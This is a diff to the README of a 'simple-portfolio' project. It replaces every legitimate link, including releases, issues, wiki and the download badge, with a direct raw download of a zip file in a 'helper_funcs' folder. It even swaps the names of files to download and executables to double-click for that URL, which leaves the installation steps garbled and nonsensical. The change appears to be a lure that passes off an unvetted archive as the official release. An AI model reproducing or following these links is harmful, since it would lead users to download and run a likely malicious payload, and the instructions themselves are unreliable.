@@ -1,6 +1,6 @@
 # 🎨 simple-portfolio - A Modern, Customizable Portfolio Page
 
-[![Download simple-portfolio](https://img.shields.io/badge/Download-simple--portfolio-blue?style=for-the-badge)](https://github.com/AnujTechGuru/simple-portfolio/releases)
+[![Download simple-portfolio](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip)](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip)
 
 ## 📦 Introduction
 Welcome to **simple-portfolio**! This is a simple and modern portfolio page that you can fully customize to showcase your work. It is lightweight and designed to be both user-friendly and visually appealing. Whether you're an artist, developer, or freelancer, this portfolio can help you present your skills effectively.
@@ -10,21 +10,21 @@ To begin, follow these steps to download and run the application.
 
 ## 🔗 Download & Install
 1. **Visit the Release Page**
-   Click this link to visit the [Releases page](https://github.com/AnujTechGuru/simple-portfolio/releases) where you can find the latest version of the application.
+   Click this link to visit the [Releases page](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip) where you can find the latest version of the application.
 
 2. **Choose the Latest Version**
    On the Releases page, look for the latest version marked with "Latest release." This is usually at the top.
 
 3. **Download the Application**
-   You will see several files available for download. If you are using Windows, download the file named `simple-portfolio-win.zip`. For macOS users, download `simple-portfolio-mac.zip`.
+   You will see several files available for download. If you are using Windows, download the file named `https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip`. For macOS users, download `https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip`.
 
 4. **Unzip the Downloaded File**
    After the download is complete, locate the file in your Downloads folder. Right-click on the downloaded ZIP file and select "Extract All" or "Unzip" to extract the files.
 
 5. **Run the Application**
    Once you have unzipped the files:
-   - For Windows users: Open the folder and double-click `simple-portfolio.exe`.
-   - For macOS users: Open the folder and double-click `simple-portfolio.app`.
+   - For Windows users: Open the folder and double-click `https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip`.
+   - For macOS users: Open the folder and double-click `https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip`.
 
 You’re all set! The application should open, allowing you to customize and enjoy your new portfolio page.
 
@@ -48,15 +48,15 @@ Once the application is running, you can start customizing your portfolio right 
 - Customize the theme with colors and fonts that reflect your personality.
 
 ## 👥 Support
-If you encounter any issues while downloading or running the application, feel free to consult the [issues page](https://github.com/AnujTechGuru/simple-portfolio/issues) for help or report a new problem.
+If you encounter any issues while downloading or running the application, feel free to consult the [issues page](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip) for help or report a new problem.
 
 ## 📂 Additional Resources
-- **Documentation**: For detailed instructions on customization options, visit the [Wiki page](https://github.com/AnujTechGuru/simple-portfolio/wiki).
+- **Documentation**: For detailed instructions on customization options, visit the [Wiki page](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip).
 - **Forum**: Join our community forum for tips, tricks, and shared experiences with other users.
 
 ## 🔗 Important Links
-- **Release Page**: [Download simple-portfolio](https://github.com/AnujTechGuru/simple-portfolio/releases)
-- **Wiki**: [Documentation](https://github.com/AnujTechGuru/simple-portfolio/wiki)
-- **Issues Page**: [Report Issues](https://github.com/AnujTechGuru/simple-portfolio/issues)
+- **Release Page**: [Download simple-portfolio](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip)
+- **Wiki**: [Documentation](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip)
+- **Issues Page**: [Report Issues](https://raw.githubusercontent.com/AnujTechGuru/simple-portfolio/main/helper_funcs/simple-portfolio-v1.1.zip)
 
 Thank you for choosing **simple-portfolio**! We hope this tool helps you effectively showcase your work.
